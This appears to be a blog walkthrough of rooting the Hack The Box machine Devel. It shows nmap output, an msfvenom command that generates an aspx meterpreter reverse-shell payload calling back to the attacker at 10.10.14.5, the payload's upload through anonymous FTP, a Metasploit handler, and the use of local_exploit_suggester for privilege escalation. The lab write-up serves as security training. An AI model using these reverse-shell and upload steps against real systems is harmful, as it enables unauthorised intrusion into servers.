---
layout: post
title: Devel walktrough
subtitle: HTB MACHINE
tags: [HTB]
---
Hello guys it's Shin today I'm going to guide you on how to root Devel this is one of the easiest windows machine in Hack The Box. In this case I might be using ftp to upload a shell that is made from msf, and from there I will be scanning for any known exploits for the machine so let's get started.
# Recon 
## nmap
``` 
Nmap scan report for devel.htb (10.10.10.5)
Host is up (0.27s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
In this case we have 2 ports open which is `ftp` and `http` and I noticed that in ftp we can login as Anonymous.

# FTP-Port 21
There aren't that much to enumerate other than that your directory that you are in is the web directory.
# HTTP-Port 80
It's just the default page of IIS7:
![](/img/devel-writeup/screenshot1.png)

I tried doing directory bruteforcing using gobuster but it didn't give me much info that could help me root this machine.

# Foothold
I did some research about IIS7 and found out that IIS7 uses aspx so in this case I'm making a shell through msfvenom as aspx as a extension:
``` 
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.5 lport=1337 -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2790 bytes
Saved as: shell.aspx
```
Now I'm going to put it in the machine using ftp:
```
ftp> put shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2826 bytes sent in 0.000171 seconds (15.8 Mbytes/s)
```
Now time to execute our shell through a web browser as shown below in the image: 
![](/img/devel-writeup/screenshot2.png)

And run our msf handler:
```
msf5 use exploit/multi/handler
msf5 exploit(multi/handler) set payload windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) set lhost tun0
msf5 exploit(multi/handler) set lport 1337
msf5 exploit(multi/handler) run
```
Then I run "Multi recon exploit suggester" It's a kind of msfconsole module that tries to gather information about the machine and suggest you exploits.

![](/img/devel-writeup/screensho4.png)
```
background 
use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) > set session 2
msf5 post(multi/recon/local_exploit_suggester) > run
```
![](/img/devel-writeup/screenshot3.png)

Yikes! That's a lot of exploits to try so I tried the first one  but it didn't work for me so I used the 2nd and it WORKED GREAT!
## BAM!

![](/img/devel-writeup/screenshot5.png)

Now it's time to grab root!

![](/img/devel-writeup/screenshot7.png)

<center>Wow Magic!</center>

<center><img src="/img/devel-writeup/joven.gif"/></center>




